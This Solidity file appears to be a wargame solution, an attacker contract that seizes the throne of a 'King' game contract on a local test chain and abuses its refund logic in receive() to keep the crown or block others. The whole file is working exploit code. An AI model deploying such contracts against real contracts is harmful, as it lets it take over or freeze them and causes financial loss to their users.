// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address payable victimAddr;
    address payable owner;

    constructor(address payable _victimAddr) payable {
        victimAddr = _victimAddr;
        owner = payable(msg.sender);
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }

    function overthrowKing() external {
        // while doing cast call 0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321 "prize()(uint256)" --rpc-url http://localhost:8545
        // I've found out initial prize is 1000000000000000 which is 0.001
        uint256 initialPrize = 1000000000000000;
        (bool success, ) = victimAddr.call{value: initialPrize + 1}("");
        require(success);
    }

    receive() external payable {
        (bool success, ) = victimAddr.call{value: msg.value + 1}("");
        require(success);
    }
}
